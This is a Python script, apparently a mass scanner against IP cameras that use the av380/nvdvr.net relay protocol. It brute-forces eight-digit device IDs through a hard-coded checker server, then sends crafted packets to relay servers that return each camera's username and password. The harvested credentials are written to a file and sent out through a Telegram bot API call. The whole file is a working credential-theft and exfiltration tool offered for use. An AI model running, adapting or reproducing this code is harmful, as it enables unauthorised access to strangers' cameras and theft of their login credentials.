import socket
from socket import timeout
import struct
import multiprocessing
import time
import hashlib
import os
import sys
import requests


class server:
    # CHECKER CONFIG FOR SCANNING CAMS ONLINE IN RANGE
    SCAN_NEW_CAMS = True
    FROM_ID = 10000000
    TO_ID = 99999999
    TIMEOUT = 200
    PACK_LIST_CAMS = 9999999  # SIZE CAMS FOR 1 THREAD LISTEN
    THREAD_CHECK = 100
    SERVER_CHECKER = '149.129.177.248'
    PORT_CHECKER = 8900
    TMP_FILE = "tmp.txt"
    #########################
    # OTHER CONFIG
    DEBUG = False
    SERVER = 'ipc1300.av380.net'
    PORT = 8877
    FileListCams = "cams.txt"
    PassFile = "pass.txt"
    CamsList = None
    TMP = []

    def __init__(self):
        self.current_id = self.FROM_ID
        self.check_s = None
        self.process = None
        self.send_msg(f"Start Script")
        try:
            if len(sys.argv) == 2:
                if str(sys.argv[1]) == "scan":
                    self.SCAN_NEW_CAMS = True
            while True:
                if self.SCAN_NEW_CAMS:
                    self.GenerateListCams(f=self.FROM_ID, to=self.TO_ID)
                    print(self.current_id)
                else:
                    self.RemoveDuplicate()
                    self.CamList(self.FileListCams)
                # if not bool(self.CamsList):
                #     break
                # cams = list(self.func_chunk(self.CamsList, self.PACK_LIST_CAMS))
                #
                # for cam in cams:
                #     self.Multiprocessing(cam)
                #     time.sleep(1)

        except socket.error as e:
            print("socket creation failed with error %s\nuse Pt"
                  "python script.py scan" % (e))

    def Multiprocessing(self, devs):
        try:
            all_processes = []
            for dev in devs:
                if dev:
                    process = multiprocessing.Process(target=self.CreateSocket, args=(dev,))
                    all_processes.append(process)
                    process.start()
            for p in all_processes:
                p.join()
        except socket.error as e:
            print("socket creation failed with error %s" % (e))

    @staticmethod
    def func_chunk(lst, n):
        for x in range(0, len(lst), n):
            e_c = lst[x: n + x]

            if len(e_c) < n:
                e_c = e_c + [None for y in range(n - len(e_c))]
            yield e_c

    @staticmethod
    def chunks(lst, count):
        start = 0
        for i in range(count):
            stop = start + len(lst[i::count])
            yield lst[start:stop]
            start = stop

    def GenerateListCams(self, **k):

        x = list(range(self.current_id, self.current_id + self.PACK_LIST_CAMS))
        self.current_id = x[-1:][0]
        x = list(self.chunks(x, self.THREAD_CHECK))
        all_processes = []
        for i in x:
            process = multiprocessing.Process(target=self.CheckerOnline, args=(i,))
            all_processes.append(process)
            process.start()
        for p in all_processes:
            p.join()
        time.sleep(1)
    def CheckerOnline(self, list_ids):
        for i in list_ids:
            if i:
                try:
                    # print(f'\u001b[35m[+] Check ID: {i}\u001b[37m')
                    hexID = bytes(str(i), 'utf-8').hex()
                    data = 'ac000000f3030000'
                    data += hexID
                    data += '2e6e766476722e6e657400000000000000000000000000006022000093f5d10000000000000000000000000000000000'
                    data = bytes.fromhex(data)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.SERVER_CHECKER, self.PORT_CHECKER))
                    time.sleep(1)
                    sock.send(data)
                    response = sock.recv(4096)
                    sock.close()
                    try:
                        if response[4] == 1:
                            # print(f'\u001b[32m[+] Camera with device ID: {i} is online!\u001b[37m')
                            # Append-adds at last
                            # with open(self.FileListCams, "a") as f:
                            #     f.write(f"{i}\n")

                            process = multiprocessing.Process(target=self.CreateSocket, args=(i,))
                            process.start()
                            process.join()
                    except IndexError:
                        pass

                except ConnectionResetError:
                    print(f'\u001b[32m[+] Socket error, don\'t worry... script worked...\u001b[37m')
                    continue

    def RemoveDuplicate(self):
        lines_present = set()
        The_Output_File = open(self.TMP_FILE, "w")
        for l in open(self.FileListCams, "r"):
            # finding the hash value of the current line
            # Before performing the hash, we remove any blank spaces and new lines from the end of the line.
            # Using hashlib library determine the hash value of a line.
            hash_value = hashlib.md5(l.rstrip().encode('utf-8')).hexdigest()
            if hash_value not in lines_present:
                The_Output_File.write(l)
                lines_present.add(hash_value)
        # closing the output text file
        The_Output_File.close()
        os.replace(self.TMP_FILE, self.FileListCams)

    def ConnectToRelay(self, d):
        try:
            data = '32'
            data += bytes(str(d['id']), 'utf-8').hex()
            data += '2e6e766476722e6e65740000000000000000000000000000302e30' \
                    '2e302e30000000000000000000018a1bc4d62f4a41ae000000000000 '
            data = bytes.fromhex(data)
            relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            result = self.send_data(relay_s, data, d['relay_server'], d['relay_port'])
            if result[0] == 0xa7:
                # split out the username and password from the result
                username = result[8:result.find(b'\x00', 8)].decode('utf-8')
                password = result[0x3a:result.find(b'\x00', 0x3a)].decode('utf-8')
                print(f'\u001b[31m[+] DeviceID: {d["id"]}')
                print(f'[+] Username: {username}')
                print(f'[+] Password: {password}\u001b[37m')
                self.send_msg(f'[+] DeviceID:{d["id"]}'
                              f'[+] Username: {username}'
                              f'[+] Password: {password}')
                # self.CamsList.remove(d["id"])
                # self.SaveCams(self.CamsList)
                with open(self.PassFile, "a") as f:
                    f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
                relay_s.close()
                return d["id"]
        except socket.error as e:
            print("socket creation failed with error %s" % (e))

    @staticmethod
    def ParseRelayServer(data):
        try:
            if data[1:3] != b'\x00\x00':
                result = {'id': data[1:9].decode('utf-8'),
                          'relay_server': data[33:data.find(b'\x00', 33)].decode('utf-8'),
                          'relay_port': struct.unpack('<H', data[50:52])[0]}
                print(
                    f'\u001b[32m[+] Relay found for id {result["id"]} {result["relay_server"]}:{result["relay_port"]}\u001b[37m')
                return result
            else:
                return False
        except:
            print("Ops")

    def CamList(self, fe):
        try:
            with open(fe) as f:
                self.CamsList = [line.rstrip() for line in f if line != []]
        except IOError as e:
            print(e)
        except:
            print("Fiddlesticks! Failed")

    def CreateSocket(self, dev):
        try:
            if dev:
                check_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                check_s.settimeout(self.TIMEOUT)
                if self.DEBUG:
                    print("\u001b[31mPID: %s\u001b[37m" % self.process.pid)
                    print("\u001b[32m[+]Send request for id: %s\u001b[37m" % dev)
                data = '02070032303038333131323334333734313100020c17222d0000'
                data += bytes(str(dev), 'utf-8').hex()
                data += '2e6e766476722e6e65740000000000000000000000000000'
                data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
                data = bytes.fromhex(data)
                self.send_data(check_s, data, self.SERVER, self.PORT)
                print(f'\u001b[32m[+]Sniffing {dev}...\u001b[37m')
                time.sleep(1)
                result = (check_s.recvfrom(4096, 0))[0]
                if result[6:7] != b'\x00':
                    result = self.ParseRelayServer(result)
                    if result:
                        self.ConnectToRelay(result)
                check_s.close()
        except timeout:
            pass

    def SaveCams(self, list_id):
        with open(self.FileListCams, 'w') as fp:
            fp.write('\n'.join(list_id))

    @staticmethod
    def byte2str(s):
        return "".join(map(chr, s))

    def send_data(self, s, data, serv, port):
        if self.DEBUG:
            print(f'\u001b[32m[+]SERVER:{serv} PORT:{port}\u001b[37m')
        # print(self.byte2str(data))
        try:
            s.sendto(data, (serv, port))
        except socket.error as e:
            print("socket creation failed with error %s" % (e))
        response = s.recvfrom(4096, 0)
        return response[0]

    def send_msg(self, text):
        try:
            token = os.environ['TELEGRAM_TOKEN']
            chat_id = os.environ['TELEGRAM_CHAT_ID']
            url_req = "https://api.telegram.org/bot" + token + "/sendMessage" \
                      + "?chat_id=" + chat_id + "&text=" + text
            requests.get(url_req)
        except KeyError:
            print("Environment variable does not exist")

    def __del__(self):
        if self.DEBUG:
            print(f"\u001b[34m{self.__class__} PID: {self.process.pid} FINISHED \u001b[37m")


if __name__ == "__main__":
    func = server()
